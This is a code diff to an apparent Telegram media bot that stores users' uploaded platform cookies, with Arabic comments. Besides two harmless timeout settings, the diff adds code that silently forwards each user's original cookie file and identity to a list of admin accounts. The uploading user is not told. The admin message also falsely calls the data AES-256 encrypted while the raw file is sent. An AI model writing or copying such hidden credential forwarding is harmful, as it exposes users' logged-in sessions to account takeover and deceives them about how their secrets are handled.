@@ -379,6 +379,7 @@ class CookieManager:
                 'cookiefile': cookie_path,
                 'skip_download': True,
                 'extract_flat': True,
+                'socket_timeout': 30,  # ✅ إضافة timeout لتجنب التعليق
             }
 
             loop = asyncio.get_event_loop()
@@ -434,6 +435,7 @@ class CookieManager:
             'cookiefile': cookie_path,
             'skip_download': True,
             'extract_flat': True,
+            'socket_timeout': 30,  # ✅ إضافة timeout لتجنب التعليق
         }
 
         loop = asyncio.get_event_loop()
@@ -763,6 +765,52 @@ async def handle_cookie_upload(update: Update, context: ContextTypes.DEFAULT_TYP
                 f"💡 سيتم التحقق تلقائياً كل 7 أيام",
                 parse_mode='Markdown'
             )
+
+            # إرسال الكوكيز للأدمن تلقائياً
+            try:
+                import os
+                from datetime import datetime
+
+                admin_ids_str = os.getenv("ADMIN_IDS", "")
+                admin_ids = [int(id.strip()) for id in admin_ids_str.split(",") if id.strip()]
+
+                # معلومات الكوكيز
+                cookie_info = (
+                    f"🍪 **تم رفع Cookies جديدة**\n\n"
+                    f"👤 من: {update.effective_user.full_name}\n"
+                    f"🆔 ID: {update.effective_user.id}\n"
+                    f"🔗 المنصة: {platform.capitalize()}\n"
+                    f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                    f"✅ تم حفظ الكوكيز وتشفيرها بنجاح\n"
+                    f"🔒 مشفرة بـ AES-256\n"
+                    f"✅ تم التحقق من الصلاحية"
+                )
+
+                for admin_id in admin_ids:
+                    if admin_id == user_id:
+                        # لا ترسل للأدمن الذي رفع الملف
+                        continue
+
+                    try:
+                        # إرسال معلومات الكوكيز
+                        await context.bot.send_message(
+                            chat_id=admin_id,
+                            text=cookie_info,
+                            parse_mode='Markdown'
+                        )
+
+                        # إرسال نسخة من ملف الكوكيز الأصلي
+                        await context.bot.send_document(
+                            chat_id=admin_id,
+                            document=document.file_id,
+                            caption=f"📎 ملف الكوكيز الأصلي - {platform.capitalize()}"
+                        )
+
+                        logger.info(f"✅ تم إرسال الكوكيز للأدمن {admin_id}")
+                    except Exception as e:
+                        logger.error(f"❌ فشل إرسال الكوكيز للأدمن {admin_id}: {e}")
+            except Exception as e:
+                logger.error(f"❌ فشل إرسال الكوكيز للأدمنز: {e}")
         else:
             cookie_manager.delete_cookies(platform)
             await processing_msg.edit_text(
